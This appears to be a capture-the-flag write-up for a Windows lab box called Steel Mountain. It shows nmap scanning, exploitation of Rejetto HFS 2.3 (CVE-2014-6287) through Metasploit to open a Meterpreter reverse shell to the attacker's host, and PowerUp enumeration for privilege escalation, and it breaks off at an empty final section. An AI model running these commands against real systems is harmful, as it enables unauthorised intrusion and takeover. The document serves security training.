# Steel Mountain
*  Enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate privileges to Administrator.
## Introduction
* Browse to `http://10.10.190.37`.
* View page source.
```
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
```
## Initial Access
* Get an initial shell.
#### 1. Scan target with nmap.
```
sudo nmap -sS -sV -oN 10.10.190.37_scan.nmap 10.10.190.37
```
* Target is running another HTTP server on port 8080.
* Browse to `http:10.10.190.37:8080`.
* View page source.
```
<fieldset id='serverinfo'>
		<legend><img src="/~img0"> Server information</legend>
		<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
		<br />Server time: 2/22/2024 5:09:32 AM
		<br />Server uptime: 00:40:23
	</fieldset>
```
* "Rejetto HTTP File Server" is running on web server.
#### 2. Exploit File Server.
* Search exploit-db for exploits affecting file server version.
  * File server is vulnverable to https://nvd.nist.gov/vuln/detail/CVE-2014-6287.
* Use Metasploit to get an Inital Shell.
```
search rejetto http file server 2.3 type:exploit

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
set rhosts 10.10.190.37
set rport 8080
exploit

*] Started reverse TCP handler on 10.10.132.215:4444 
[*] Using URL: http://10.10.132.215:8080/AHrBVKMyZam
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /AHrBVKMyZam
[*] Sending stage (175686 bytes) to 10.10.190.37
[!] Tried to delete %TEMP%\eojOuZkUFsb.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.132.215:4444 -> 10.10.190.37:49261) at 2024-02-22 13:24:25 +0000
[*] Server stopped.

getuid
Server username: STEELMOUNTAIN\bill
```
* User flag is located in `C:\Users\bill\Desktop\user.txt`.
## Privilege Escalation
* Further enumerate target and escalate privileges to root.
* Use [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) PowerShell script to enumerate target.
  * Evaluates Windows target and determines any obnormalities.
> PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

--2024-02-22 13:43:06--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: \u2018PowerUp.ps1\u2019

PowerUp.ps1         100%[===================>] 586.50K  --.-KB/s    in 0.004s  

2024-02-22 13:43:06 (132 MB/s) - \u2018PowerUp.ps1\u2019 saved [600580/600580]
```
* Use Metasploit `upload` to upload script to target.
```
upload /root/PowerUp.ps1
[*] Uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /root/PowerUp.ps1 -> PowerUp.ps1
```
* Load PowerShell extension into Meterpreter.
```
load powershell
Loading extension powershell...Success.
```
* Enter PowerShell.
```
powershell_shell
```
* Execute script.
```
. .\PowerUp.ps1
Invoke-AllChecks
```
* "AdvancedSystemCareService9" service appears as an "Unquoted Service Paths" vulnerability with `CanRestart` option set to `true` in this example.
## Access and Escalation Without Metasploit
